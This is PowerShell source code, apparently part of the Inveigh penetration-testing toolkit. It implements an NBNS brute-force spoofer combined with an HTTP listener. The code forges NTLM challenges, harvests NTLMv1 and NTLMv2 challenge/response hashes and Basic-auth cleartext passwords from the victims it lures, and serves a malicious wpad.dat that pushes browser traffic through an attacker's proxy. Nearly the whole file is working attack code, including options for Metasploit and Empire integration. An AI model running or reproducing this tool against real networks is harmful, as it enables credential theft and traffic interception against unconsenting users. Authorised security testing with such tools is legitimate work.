function Invoke-InveighBruteForce
{
<#
.SYNOPSIS
Invoke-InveighBruteForce is a remote (Hot Potato method)/unprivileged NBNS brute force spoofer.

.DESCRIPTION
Invoke-InveighBruteForce is a remote (Hot Potato method)/unprivileged NBNS brute force spoofer with the following
features:

    Targeted IPv4 NBNS brute force spoofer with granular control
    NTLMv1/NTLMv2 challenge/response capture over HTTP
    Granular control of console and file output
    Run time control

This function can be used to perform NBNS spoofing across subnets and/or perform NBNS spoofing without an elevated
administrator or SYSTEM shell.

.PARAMETER SpooferIP
Specify an IP address for NBNS spoofing. This parameter is only necessary when redirecting victims to a system
other than the Inveigh Brute Force host.  

.PARAMETER SpooferTarget
Specify an IP address to target for brute force NBNS spoofing. 

.PARAMETER Hostname
Default = WPAD: Specify a hostname for NBNS spoofing.

.PARAMETER NBNS
Default = Disabled: (Y/N) Enable/Disable NBNS spoofing.

.PARAMETER NBNSPause
Default = Disabled: (Integer) Specify the number of seconds the NBNS brute force spoofer will stop spoofing after
an incoming HTTP request is received.

.PARAMETER NBNSTTL
Default = 165 Seconds: Specify a custom NBNS TTL in seconds for the response packet.

.PARAMETER HTTP
Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.

.PARAMETER HTTPIP
Default = Any: Specify a TCP IP address for the HTTP listener.

.PARAMETER HTTPPort
Default = 80: Specify a TCP port for the HTTP listener.

.PARAMETER HTTPAuth
Default = NTLM: (Anonymous,Basic,NTLM) Specify the HTTP/HTTPS server authentication type. This setting does not
apply to wpad.dat requests.

.PARAMETER HTTPBasicRealm
Specify a realm name for Basic authentication. This parameter applies to both HTTPAuth and WPADAuth.

.PARAMETER HTTPResponse
Specify a string or HTML to serve as the default HTTP/HTTPS response. This response will not be used for wpad.dat
requests. Use PowerShell character escapes where necessary.

.PARAMETER WPADAuth
Default = NTLM: (Anonymous,Basic,NTLM) Specify the HTTP/HTTPS server authentication type for wpad.dat requests.
Setting to Anonymous can prevent browser login prompts.

.PARAMETER WPADIP
Specify a proxy server IP to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter
must be used with WPADPort.

.PARAMETER WPADPort
Specify a proxy server port to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter
must be used with WPADIP.

.PARAMETER WPADDirectHosts
Comma separated list of hosts to list as direct in the wpad.dat file. Listed hosts will not be routed through the
defined proxy. Use PowerShell character escapes where necessary.

.PARAMETER WPADResponse
Specify wpad.dat file contents to serve as the wpad.dat response. This parameter will not be used if WPADIP and
WPADPort are set.

.PARAMETER Challenge
Default = Random: Specify a 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a
random challenge will be generated for each request. This will only be used for non-relay captures.

.PARAMETER MachineAccounts
Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.

.PARAMETER ConsoleOutput
Default = Disabled: (Y/N) Enable/Disable real time console output. If using this option through a shell, test to
ensure that it doesn't hang the shell.

.PARAMETER FileOutput
Default = Disabled: (Y/N) Enable/Disable real time file output.

.PARAMETER StatusOutput
Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.

.PARAMETER OutputStreamOnly
Default = Disabled: (Y/N) Enable/Disable forcing all output to the standard output stream. This can be helpful if
running Inveigh Brute Force through a shell that does not return other output streams. Note that you will not see
the various yellow warning messages if enabled.

.PARAMETER OutputDir
Default = Working Directory: Set a valid path to an output directory for log and capture files. FileOutput must
also be enabled.

.PARAMETER RunTime
Default = Unlimited: (Integer) Set the run time duration in minutes.

.PARAMETER RunCount
Default = Unlimited: (Integer) Set the number of captures to perform before auto-exiting.

.PARAMETER ShowHelp
Default = Enabled: (Y/N) Enable/Disable the help messages at startup.

.PARAMETER Tool
Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Metasploit's
Interactive Powershell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire   

.EXAMPLE
Import-Module .\Inveigh.psd1;Invoke-InveighBruteForce -SpooferTarget 192.168.1.11 
Import full module and target 192.168.1.11 for 'WPAD' hostname spoofs.

.EXAMPLE
Invoke-InveighBruteForce -SpooferTarget 192.168.1.11 -Hostname server1
Target 192.168.1.11 for 'server1' hostname spoofs.

.EXAMPLE
Invoke-InveighBruteForce -SpooferTarget 192.168.1.11 -WPADIP 192.168.10.10 -WPADPort 8080
Target 192.168.1.11 for 'WPAD' hostname spoofs and respond to wpad.dat requests with a proxy of 192.168.10.10:8080.

.LINK
https://github.com/Kevin-Robertson/Inveigh
#>

# Parameter default values can be modified in this section: 
[CmdletBinding()]
param
(
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTP="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NBNS="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ConsoleOutput="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileOutput="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StatusOutput="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$OutputStreamOnly="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$MachineAccounts="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShowHelp="Y",
    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$Tool="0",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM")][String]$HTTPAuth="NTLM",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM")][String]$WPADAuth="NTLM",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$HTTPIP="",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$SpooferIP="",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$SpooferTarget="",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$WPADIP = "",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$OutputDir="",
    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$Challenge="",
    [parameter(Mandatory=$false)][Array]$WPADDirectHosts="",
    [parameter(Mandatory=$false)][Int]$HTTPPort="80",
    [parameter(Mandatory=$false)][Int]$NBNSPause="",
    [parameter(Mandatory=$false)][Int]$NBNSTTL="165",
    [parameter(Mandatory=$false)][Int]$WPADPort="",
    [parameter(Mandatory=$false)][Int]$RunCount="",
    [parameter(Mandatory=$false)][Int]$RunTime="",
    [parameter(Mandatory=$false)][String]$HTTPBasicRealm="IIS",
    [parameter(Mandatory=$false)][String]$HTTPResponse="",
    [parameter(Mandatory=$false)][String]$WPADResponse="",   
    [parameter(Mandatory=$false)][String]$Hostname = "WPAD", 
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)

if ($invalid_parameter)
{
    throw "$($invalid_parameter) is not a valid parameter."
}

if(!$SpooferIP)
{
    $SpooferIP = (Test-Connection 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)  
}

if($NBNS -eq 'Y' -and !$SpooferTarget)
{
    throw "You must specify a -SpooferTarget if enabling -NBNS"
}

if($WPADIP -or $WPADPort)
{

    if(!$WPADIP)
    {
        throw "You must specify a -WPADPort to go with -WPADIP"
    }

    if(!$WPADPort)
    {
        throw "You must specify a -WPADIP to go with -WPADPort"
    }

}

if(!$OutputDir)
{ 
    $output_directory = $PWD.Path
}
else
{
    $output_directory = $OutputDir
}

if(!$inveigh)
{
    $global:inveigh = [HashTable]::Synchronized(@{})
    $inveigh.log = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_username_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_username_list = New-Object System.Collections.ArrayList
    $inveigh.cleartext_list = New-Object System.Collections.ArrayList
    $inveigh.IP_capture_list = New-Object System.Collections.ArrayList
    $inveigh.SMBRelay_failed_list = New-Object System.Collections.ArrayList
}

if($inveigh.bruteforce_running)
{
    throw "Invoke-InveighBruteForce is already running, use Stop-Inveigh"
}

$inveigh.console_queue = New-Object System.Collections.ArrayList
$inveigh.status_queue = New-Object System.Collections.ArrayList
$inveigh.log_file_queue = New-Object System.Collections.ArrayList
$inveigh.NTLMv1_file_queue = New-Object System.Collections.ArrayList
$inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList
$inveigh.cleartext_file_queue = New-Object System.Collections.ArrayList
$inveigh.HTTP_challenge_queue = New-Object System.Collections.ArrayList
$inveigh.console_output = $false
$inveigh.console_input = $true
$inveigh.file_output = $false
$inveigh.log_out_file = $output_directory + "\Inveigh-Log.txt"
$inveigh.NTLMv1_out_file = $output_directory + "\Inveigh-NTLMv1.txt"
$inveigh.NTLMv2_out_file = $output_directory + "\Inveigh-NTLMv2.txt"
$inveigh.cleartext_out_file = $output_directory + "\Inveigh-Cleartext.txt"
$inveigh.challenge = $Challenge
$inveigh.hostname_spoof = $false
$inveigh.bruteforce_running = $true

if($StatusOutput -eq 'Y')
{
    $inveigh.status_output = $true
}
else
{
    $inveigh.status_output = $false
}

if($OutputStreamOnly -eq 'Y')
{
    $inveigh.output_stream_only = $true
}
else
{
    $inveigh.output_stream_only = $false
}

if($Tool -eq 1) # Metasploit Interactive PowerShell
{
    $inveigh.tool = 1
    $inveigh.output_stream_only = $true
    $inveigh.newline = ""
    $ConsoleOutput = "N"
}
elseif($Tool -eq 2) # PowerShell Empire
{
    $inveigh.tool = 2
    $inveigh.output_stream_only = $true
    $inveigh.console_input = $false
    $inveigh.newline = "`n"
    $ConsoleOutput = "Y"
    $ShowHelp = "N"
}
else
{
    $inveigh.tool = 0
    $inveigh.newline = ""
}

# Write startup messages
$inveigh.status_queue.Add("Inveigh Brute Force started at $(Get-Date -format 's')") > $null
$inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh Brute Force started")])  > $null

if($NBNS -eq 'Y')
{   
    $inveigh.status_queue.Add("NBNS Brute Force Spoofer Target = $SpooferTarget") > $null
    $inveigh.status_queue.Add("NBNS Brute Force Spoofer IP Address = $SpooferIP") > $null
    $inveigh.status_queue.Add("NBNS Brute Force Spoofer Hostname = $Hostname") > $null

    if($NBNSPause)
    {
        $inveigh.status_queue.Add("NBNS Brute Force Pause = $NBNSPause Seconds") > $null
    }

    $inveigh.status_queue.Add("NBNS TTL = $NBNSTTL Seconds") > $null
}
else
{
    $inveigh.status_queue.Add("NBNS Brute Force Spoofer Disabled") > $null
}

if($HTTP -eq 'Y')
{

    if($HTTPIP)
    {
        $inveigh.status_queue.Add("HTTP IP Address = $HTTPIP") > $null
    }

    if($HTTPPort -ne 80)
    {
        $inveigh.status_queue.Add("HTTP Port = $HTTPPort") > $null
    }

    $inveigh.status_queue.Add("HTTP Capture Enabled") > $null
    $inveigh.status_queue.Add("HTTP Authentication = $HTTPAuth") > $null
    $inveigh.status_queue.Add("WPAD Authentication = $WPADAuth") > $null

    if($HTTPResponse)
    {
        $inveigh.status_queue.Add("HTTP Custom Response Enabled") > $null
    }

    if($HTTPAuth -eq 'Basic' -or $WPADAuth -eq 'Basic')
    {
        $inveigh.status_queue.Add("Basic Authentication Realm = $HTTPBasicRealm") > $null
    }

    if($WPADIP -and $WPADPort)
    {
        $inveigh.status_queue.Add("WPAD = $WPADIP`:$WPADPort") > $null

        if($WPADDirectHosts)
        {
            $inveigh.status_queue.Add("WPAD Direct Hosts = " + $WPADDirectHosts -join ",") > $null
        }

    }
    elseif($WPADResponse -and !$WPADIP -and !$WPADPort)
    {
        $inveigh.status_queue.Add("WPAD Custom Response Enabled") > $null
    }

    if($Challenge)
    {
        $inveigh.status_queue.Add("NTLM Challenge = $Challenge") > $null
    }

    if($MachineAccounts -eq 'n')
    {
        $inveigh.status_queue.Add("Ignoring Machine Accounts") > $null
        $inveigh.machine_accounts = $false
    }
    else
    {
        $inveigh.machine_accounts = $true
    }

}
else
{
    $inveigh.status_queue.Add("HTTP Capture Disabled") > $null
}

if($ConsoleOutput -eq 'Y')
{
    $inveigh.status_queue.Add("Real Time Console Output Enabled") > $null
    $inveigh.console_output = $true
}
else
{

    if($inveigh.tool -eq 1)
    {
        $inveigh.status_queue.Add("Real Time Console Output Disabled Due To External Tool Selection") > $null
    }
    else
    {
        $inveigh.status_queue.Add("Real Time Console Output Disabled") > $null
    }

}

if($FileOutput -eq 'Y')
{
    $inveigh.status_queue.Add("Real Time File Output Enabled") > $null
    $inveigh.status_queue.Add("Output Directory = $output_directory") > $null
    $inveigh.file_output = $true
}
else
{
    $inveigh.status_queue.Add("Real Time File Output Disabled") > $null
}

if($RunTime -eq 1)
{
    $inveigh.status_queue.Add("Run Time = $RunTime Minute") > $null
}
elseif($RunTime -gt 1)
{
    $inveigh.status_queue.Add("Run Time = $RunTime Minutes") > $null
}

if($RunCount)
{
    $inveigh.status_queue.Add("Run Count = $RunCount") > $null
}

if($ShowHelp -eq 'Y')
{
    $inveigh.status_queue.Add("Use Get-Command -Noun Inveigh* to show available functions") > $null
    $inveigh.status_queue.Add("Run Stop-Inveigh to stop running Inveigh functions") > $null
        
    if($inveigh.console_output)
    {
        $inveigh.status_queue.Add("Press any key to stop real time console output") > $null
    }

}

if($inveigh.status_output)
{

    while($inveigh.status_queue.Count -gt 0)
    {

        if($inveigh.output_stream_only)
        {
            Write-Output($inveigh.status_queue[0] + $inveigh.newline)
            $inveigh.status_queue.RemoveRange(0,1)
        }
        else
        {

            switch ($inveigh.status_queue[0])
            {

                "Run Stop-Inveigh to stop running Inveigh functions"
                {
                    Write-Warning($inveigh.status_queue[0])
                    $inveigh.status_queue.RemoveRange(0,1)
                }

                default
                {
                    Write-Output($inveigh.status_queue[0])
                    $inveigh.status_queue.RemoveRange(0,1)
                }

            }

        }

    }

}

# Begin ScriptBlocks

# Shared Basic functions ScriptBlock
$shared_basic_functions_scriptblock =
{
    function DataLength
    {
        param ([Int]$length_start,[Byte[]]$string_extract_data)

        $string_length = [System.BitConverter]::ToInt16($string_extract_data[$length_start..($length_start + 1)],0)
        return $string_length
    }

    function DataToString
    {
        param ([Int]$string_length,[Int]$string2_length,[Int]$string3_length,[Int]$string_start,[Byte[]]$string_extract_data)

        $string_data = [System.BitConverter]::ToString($string_extract_data[($string_start+$string2_length+$string3_length)..($string_start+$string_length+$string2_length+$string3_length - 1)])
        $string_data = $string_data -replace "-00",""
        $string_data = $string_data.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
        return $string_extract
    }

    function HTTPListenerStop
    {
        $inveigh.console_queue.Add("$(Get-Date -format 's') - Attempting to stop HTTP listener")
        $inveigh.HTTP_client.Close()
        start-sleep -s 1
        $inveigh.HTTP_listener.server.blocking = $false
        Start-Sleep -s 1
        $inveigh.HTTP_listener.server.Close()
        Start-Sleep -s 1
        $inveigh.HTTP_listener.Stop()
    }

}

# HTTP Server ScriptBlock - HTTP listener
$HTTP_scriptblock = 
{ 
    param ($HTTPAuth,$HTTPBasicRealm,$HTTPResponse,$NBNSPause,$WPADAuth,$WPADIP,$WPADPort,$WPADDirectHosts,$WPADResponse,$RunCount)

    function NTLMChallengeBase64
    {

        $HTTP_timestamp = Get-Date
        $HTTP_timestamp = $HTTP_timestamp.ToFileTime()
        $HTTP_timestamp = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_timestamp))
        $HTTP_timestamp = $HTTP_timestamp.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

        if($inveigh.challenge)
        {
            $HTTP_challenge = $inveigh.challenge
            $HTTP_challenge_bytes = $inveigh.challenge.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        else
        {
            $HTTP_challenge_bytes = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $HTTP_challenge = $HTTP_challenge_bytes -replace ' ', ''
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }

        $inveigh.HTTP_challenge_queue.Add($inveigh.HTTP_client.Client.RemoteEndpoint.Address.IPAddressToString + $inveigh.HTTP_client.Client.RemoteEndpoint.Port + ',' + $HTTP_challenge)  > $null

        $HTTP_NTLM_bytes = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,
                           0x00,0x00,0x00,0x05,0x82,0x89,0xa2 +
                           $HTTP_challenge_bytes +
                           0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,
                           0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00,0x02,0x00,0x06,0x00,
                           0x4c,0x00,0x41,0x00,0x42,0x00,0x01,0x00,0x10,0x00,0x48,0x00,0x4f,0x00,0x53,0x00,0x54,
                           0x00,0x4e,0x00,0x41,0x00,0x4d,0x00,0x45,0x00,0x04,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,
                           0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x03,0x00,0x24,
                           0x00,0x68,0x00,0x6f,0x00,0x73,0x00,0x74,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,
                           0x2e,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,
                           0x00,0x6c,0x00,0x05,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,
                           0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x07,0x00,0x08,0x00 +
                           $HTTP_timestamp +
                           0x00,0x00,0x00,0x00,0x0a,0x0a

        $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
        $NTLM = 'NTLM ' + $NTLM_challenge_base64
        $NTLM_challenge = $HTTP_challenge
        
        return $NTLM
    }

    $HTTP_WWW_authenticate_header = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20 # WWW-Authenticate
    $run_count_NTLMv1 = $RunCount + $inveigh.NTLMv1_list.Count
    $run_count_NTLMv2 = $RunCount + $inveigh.NTLMv2_list.Count
    $run_count_cleartext = $RunCount + $inveigh.cleartext_list.Count

    if($WPADIP -and $WPADPort)
    {

        if($WPADDirectHosts)
        {

            foreach($WPAD_direct_host in $WPADDirectHosts)
            {
                $WPAD_direct_hosts_function += 'if (dnsDomainIs(host, "' + $WPAD_direct_host + '")) return "DIRECT";'
            }

            $HTTP_WPAD_response = "function FindProxyForURL(url,host){" + $WPAD_direct_hosts_function + "return `"PROXY " + $WPADIP + ":" + $WPADPort + "`";}"
        }
        else
        {
            $HTTP_WPAD_response = "function FindProxyForURL(url,host){return `"PROXY " + $WPADIP + ":" + $WPADPort + "`";}"
        }

    }
    elseif($WPADResponse)
    {
        $HTTP_WPAD_response = $WPADResponse
    }

    :HTTP_listener_loop while ($inveigh.bruteforce_running)
    {

        $TCP_request = $NULL
        $TCP_request_bytes = New-Object System.Byte[] 1024
        $suppress_waiting_message = $false

        while(!$inveigh.HTTP_listener.Pending() -and !$inveigh.HTTP_client.Connected)
        {

            if(!$suppress_waiting_message)
            {
                $inveigh.console_queue.Add("$(Get-Date -format 's') - Waiting for incoming HTTP connection")
                $suppress_waiting_message = $true
            }

            Start-Sleep -s 1

            if(!$inveigh.bruteforce_running)
            {
                HTTPListenerStop
            }
        
        }

        if(!$inveigh.HTTP_client.Connected)
        {
            $inveigh.HTTP_client = $inveigh.HTTP_listener.AcceptTcpClient() # will block here until connection 
	        $HTTP_stream = $inveigh.HTTP_client.GetStream() 
        }

        while ($HTTP_stream.DataAvailable)
        {
            $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length)
        }

        $TCP_request = [System.BitConverter]::ToString($TCP_request_bytes)

        if($TCP_request -like "47-45-54-20*" -or $TCP_request -like "48-45-41-44-20*" -or $TCP_request -like "4f-50-54-49-4f-4e-53-20*")
        {
            $HTTP_raw_URL = $TCP_request.Substring($TCP_request.IndexOf("-20-") + 4,$TCP_request.Substring($TCP_request.IndexOf("-20-") + 1).IndexOf("-20-") - 3)
            $HTTP_raw_URL = $HTTP_raw_URL.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $HTTP_request_raw_URL = New-Object System.String ($HTTP_raw_URL,0,$HTTP_raw_URL.Length)

            if($NBNSPause)
            {
                $inveigh.NBNS_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
                $inveigh.hostname_spoof = $true
            }
        
        }

        if($TCP_request -like "*-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-*")
        {
            $HTTP_authorization_header = $TCP_request.Substring($TCP_request.IndexOf("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-") + 46)
            $HTTP_authorization_header = $HTTP_authorization_header.Substring(0,$HTTP_authorization_header.IndexOf("-0D-0A-"))
            $HTTP_authorization_header = $HTTP_authorization_header.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $authentication_header = New-Object System.String ($HTTP_authorization_header,0,$HTTP_authorization_header.Length)
        }
        else
        {
            $authentication_header =  ''
        }

        if($HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -eq 'Anonymous')
        {
            $HTTP_response_status_code = 0x32,0x30,0x30
            $HTTP_response_phrase = 0x4f,0x4b
        }
        else
        {
            $HTTP_response_status_code = 0x34,0x30,0x31
            $HTTP_response_phrase = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64
        }

        $HTTP_type = "HTTP"
        $NTLM = 'NTLM'
        $NTLM_auth = $false

        if($HTTP_request_raw_URL_old -ne $HTTP_request_raw_URL -or $HTTP_client_handle_old -ne $inveigh.HTTP_client.Client.Handle)
        {
            $inveigh.console_queue.Add("$(Get-Date -format 's') - $HTTP_type request for " + $HTTP_request_raw_URL + " received from " + $inveigh.HTTP_client.Client.RemoteEndpoint.Address)
            $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type request for " + $HTTP_request_raw_URL + " received from " + $inveigh.HTTP_client.Client.RemoteEndpoint.Address)])
        }

        if($authentication_header.startswith('NTLM '))
        {
            $authentication_header = $authentication_header -replace 'NTLM ',''
            [Byte[]] $HTTP_request_bytes = [System.Convert]::FromBase64String($authentication_header)
            $HTTP_response_status_code = 0x34,0x30,0x31
            
            if ($HTTP_request_bytes[8] -eq 1)
            {
                $HTTP_response_status_code = 0x34,0x30,0x31
                $NTLM = NTLMChallengeBase64
            }
            elseif ($HTTP_request_bytes[8] -eq 3)
            {
                $NTLM = 'NTLM'
                $HTTP_NTLM_offset = $HTTP_request_bytes[24]
                $HTTP_NTLM_length = DataLength 22 $HTTP_request_bytes
                $HTTP_NTLM_domain_length = DataLength 28 $HTTP_request_bytes
                $HTTP_NTLM_domain_offset = DataLength 32 $HTTP_request_bytes
                [String] $NTLM_challenge = $inveigh.HTTP_challenge_queue -like $inveigh.HTTP_client.Client.RemoteEndpoint.Address.IPAddressToString + $inveigh.HTTP_client.Client.RemoteEndpoint.Port + '*'
                $inveigh.HTTP_challenge_queue.Remove($NTLM_challenge)
                $NTLM_challenge = $NTLM_challenge.Substring(($NTLM_challenge.IndexOf(","))+1)
                       
                if($HTTP_NTLM_domain_length -eq 0)
                {
                    $HTTP_NTLM_domain_string = ''
                }
                else
                {  
                    $HTTP_NTLM_domain_string = DataToString $HTTP_NTLM_domain_length 0 0 $HTTP_NTLM_domain_offset $HTTP_request_bytes
                } 
                    
                $HTTP_NTLM_user_length = DataLength 36 $HTTP_request_bytes
                $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_length $HTTP_NTLM_domain_length 0 $HTTP_NTLM_domain_offset $HTTP_request_bytes
                $HTTP_NTLM_host_length = DataLength 44 $HTTP_request_bytes
                $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_length $HTTP_NTLM_domain_length $HTTP_NTLM_user_length $HTTP_NTLM_domain_offset $HTTP_request_bytes
        
                if($HTTP_NTLM_length -eq 24) # NTLMv1
                {
                    $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[($HTTP_NTLM_offset - 24)..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                    $NTLM_response = $NTLM_response.Insert(48,':')
                    $inveigh.HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_response + ":" + $NTLM_challenge
                    
                    if($NTLM_challenge -and $NTLM_response -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
                    {    
                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from " + $inveigh.HTTP_client.Client.RemoteEndpoint.Address + "(" + $HTTP_NTLM_host_string + ")")])
                        $inveigh.NTLMv1_file_queue.Add($inveigh.HTTP_NTLM_hash)
                        $inveigh.NTLMv1_list.Add($inveigh.HTTP_NTLM_hash)
                        $inveigh.console_queue.Add("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response captured from " + $inveigh.HTTP_client.Client.RemoteEndpoint.Address + "(" + $HTTP_NTLM_host_string + "):`n" + $inveigh.HTTP_NTLM_hash)
                        
                        if($inveigh.file_output)
                        {
                            $inveigh.console_queue.Add("$HTTP_type NTLMv1 challenge/response written to " + $inveigh.NTLMv1_out_file)
                        }

                    }

                    $HTTP_response_status_code = 0x32,0x30,0x30
                    $HTTP_client_close = $true
                    $NTLM_challenge = ''
                }
                else # NTLMv2
                {         
                    $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[$HTTP_NTLM_offset..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                    $NTLM_response = $NTLM_response.Insert(32,':')
                    $inveigh.HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLM_response

                    if($NTLM_challenge -and $NTLM_response -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
                    {
                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from " + $inveigh.HTTP_client.Client.RemoteEndpoint.Address + "(" + $HTTP_NTLM_host_string + ")")])
                        $inveigh.NTLMv2_file_queue.Add($inveigh.HTTP_NTLM_hash)
                        $inveigh.NTLMv2_list.Add($inveigh.HTTP_NTLM_hash)
                        $inveigh.console_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response captured from " + $inveigh.HTTP_client.Client.RemoteEndpoint.Address + "(" + $HTTP_NTLM_host_string + "):`n" + $inveigh.HTTP_NTLM_hash)
                        
                        if($inveigh.file_output)
                        {
                            $inveigh.console_queue.Add("$HTTP_type NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file)
                        }
                        
                    }

                }
                
                $HTTP_response_status_code = 0x32,0x30,0x30
                $HTTP_response_phrase = 0x4f,0x4b
                $NTLM_auth = $true
                $HTTP_client_close = $true
                $NTLM_challenge = ''
            }
            else
            {
                $NTLM = 'NTLM'
            }

        }
        elseif($authentication_header.startswith('Basic '))
        {
            $HTTP_response_status_code = 0x32,0x30,0x30
            $HTTP_response_phrase = 0x4f,0x4b
            $authentication_header = $authentication_header -replace 'Basic ',''
            $cleartext_credentials = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($authentication_header))
            $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Basic auth cleartext credentials captured from " + $inveigh.HTTP_client.Client.RemoteEndpoint.Address)])
            $inveigh.cleartext_file_queue.Add($cleartext_credentials)
            $inveigh.cleartext_list.Add($cleartext_credentials)
            $inveigh.console_queue.Add("$(Get-Date -format 's') - Basic auth cleartext credentials $cleartext_credentials captured from " + $inveigh.HTTP_client.Client.RemoteEndpoint.Address)

            if($inveigh.file_output)
            {
                $inveigh.console_queue.Add("Basic auth cleartext credentials written to " + $inveigh.cleartext_out_file)
            }
                 
        }

        $HTTP_timestamp = Get-Date -format r
        $HTTP_timestamp = [System.Text.Encoding]::UTF8.GetBytes($HTTP_timestamp)

        if((($WPADIP -and $WPADPort) -or $WPADResponse) -and $HTTP_request_raw_URL -match '/wpad.dat')
        {
            $HTTP_message = $HTTP_WPAD_response
        }
        elseif($HTTPResponse -and $HTTP_request_raw_URL -notmatch '/wpad.dat')
        {
            $HTTP_message = $HTTPResponse
        }
        else
        {
            $HTTP_message = ''

        }

        $HTTP_timestamp = Get-Date -format r
        $HTTP_timestamp = [System.Text.Encoding]::UTF8.GetBytes($HTTP_timestamp)

